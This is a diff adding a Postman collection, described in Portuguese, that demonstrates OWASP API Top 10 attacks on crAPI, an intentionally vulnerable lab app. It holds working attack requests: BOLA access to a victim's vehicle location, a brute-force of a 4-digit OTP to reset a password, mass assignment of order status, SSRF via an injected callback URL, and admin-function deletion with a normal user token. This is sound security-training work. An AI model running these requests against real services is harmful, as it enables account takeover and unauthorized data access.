@@ -1,0 +1,173 @@
+{
+  "info": {
+    "name": "crAPI — Security Top 10",
+    "description": "Coleção de requisições que demonstram vulnerabilidades do OWASP API Security Top 10 no crAPI. Requer o environment 'crAPI (local)' com base_url e tokens preenchidos. Todos os paths devem ser confirmados contra a instância em uso (ver docs/).",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "00 - Setup",
+      "item": [
+        {
+          "name": "Login (vitima)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const json = pm.response.json();",
+                  "if (json && json.token) { pm.environment.set('token_vitima', json.token); }",
+                  "pm.test('login retornou token', () => pm.expect(json.token).to.be.a('string'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "url": { "raw": "{{base_url}}/identity/api/auth/login", "host": ["{{base_url}}"], "path": ["identity", "api", "auth", "login"] },
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"{{email_vitima}}\",\n  \"password\": \"{{senha_vitima}}\"\n}" }
+          }
+        },
+        {
+          "name": "Login (atacante)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const json = pm.response.json();",
+                  "if (json && json.token) { pm.environment.set('token_atacante', json.token); }",
+                  "pm.test('login retornou token', () => pm.expect(json.token).to.be.a('string'));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "url": { "raw": "{{base_url}}/identity/api/auth/login", "host": ["{{base_url}}"], "path": ["identity", "api", "auth", "login"] },
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"{{email_atacante}}\",\n  \"password\": \"{{senha_atacante}}\"\n}" }
+          }
+        }
+      ]
+    },
+    {
+      "name": "01 - BOLA (localizacao de veiculo)",
+      "item": [
+        {
+          "name": "GET localizacao do veiculo da vitima (como atacante)",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_atacante}}" }],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/vehicle/{{vehicle_id_vitima}}/location",
+              "host": ["{{base_url}}"],
+              "path": ["identity", "api", "v2", "vehicle", "{{vehicle_id_vitima}}", "location"]
+            },
+            "description": "Esperado (vulneravel): 200 com dados do veiculo da vitima, mesmo usando o token do atacante."
+          }
+        }
+      ]
+    },
+    {
+      "name": "02 - Broken Authentication (brute-force OTP)",
+      "item": [
+        {
+          "name": "Disparar OTP (forget-password)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "url": { "raw": "{{base_url}}/identity/api/auth/forget-password", "host": ["{{base_url}}"], "path": ["identity", "api", "auth", "forget-password"] },
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"{{email_vitima}}\"\n}" }
+          }
+        },
+        {
+          "name": "check-otp (iterar otp via Collection Runner / data file)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "url": { "raw": "{{base_url}}/identity/api/auth/v3/check-otp", "host": ["{{base_url}}"], "path": ["identity", "api", "auth", "v3", "check-otp"] },
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"{{email_vitima}}\",\n  \"otp\": \"{{otp}}\",\n  \"password\": \"NovaSenha123!\"\n}" },
+            "description": "Rodar no Collection Runner com um data file CSV contendo a coluna 'otp' de 0000..9999. Confirmar se existe tambem o endpoint v2 sem rate limit."
+          }
+        }
+      ]
+    },
+    {
+      "name": "03 - Excessive Data Exposure",
+      "item": [
+        {
+          "name": "GET posts recentes da comunidade",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_atacante}}" }],
+            "url": { "raw": "{{base_url}}/community/api/v2/community/posts/recent", "host": ["{{base_url}}"], "path": ["community", "api", "v2", "community", "posts", "recent"] },
+            "description": "Inspecionar o JSON: campos como email e vehicleid dos autores nao aparecem na UI, mas vazam na resposta."
+          }
+        }
+      ]
+    },
+    {
+      "name": "04 - Mass Assignment",
+      "item": [
+        {
+          "name": "GET pedidos (obter order_id)",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_vitima}}" }],
+            "url": { "raw": "{{base_url}}/workshop/api/shop/orders", "host": ["{{base_url}}"], "path": ["workshop", "api", "shop", "orders"] }
+          }
+        },
+        {
+          "name": "PUT editar pedido (injetar status)",
+          "request": {
+            "method": "PUT",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{token_vitima}}" },
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "url": { "raw": "{{base_url}}/workshop/api/shop/orders/{{order_id}}", "host": ["{{base_url}}"], "path": ["workshop", "api", "shop", "orders", "{{order_id}}"] },
+            "body": { "mode": "raw", "raw": "{\n  \"status\": \"returned\",\n  \"quantity\": 1\n}" },
+            "description": "Confirmar metodo/caminho e nome do campo de status contra o fluxo legitimo de return order."
+          }
+        }
+      ]
+    },
+    {
+      "name": "05 - SSRF",
+      "item": [
+        {
+          "name": "POST contact_mechanic (URL injetada)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{token_atacante}}" },
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "url": { "raw": "{{base_url}}/workshop/api/merchant/contact_mechanic", "host": ["{{base_url}}"], "path": ["workshop", "api", "merchant", "contact_mechanic"] },
+            "body": { "mode": "raw", "raw": "{\n  \"mechanic_api\": \"{{ssrf_callback_url}}\",\n  \"mechanic_code\": \"TRAC_JHN\",\n  \"problem_details\": \"teste\",\n  \"vin\": \"\",\n  \"number_of_repeats\": 1\n}" },
+            "description": "Confirmar nome do campo (mechanic_api vs merchant_api) e campos obrigatorios capturando o fluxo legitimo primeiro."
+          }
+        }
+      ]
+    },
+    {
+      "name": "06 - BFLA",
+      "item": [
+        {
+          "name": "DELETE video via endpoint admin (como usuario comum)",
+          "request": {
+            "method": "DELETE",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token_atacante}}" }],
+            "url": { "raw": "{{base_url}}/identity/api/v2/admin/videos/{{video_id_vitima}}", "host": ["{{base_url}}"], "path": ["identity", "api", "v2", "admin", "videos", "{{video_id_vitima}}"] },
+            "description": "Esperado (vulneravel): funcao de admin executa com token de usuario comum. Confirmar caminho exato do endpoint de admin."
+          }
+        }
+      ]
+    }
+  ],
+  "variable": []
+}
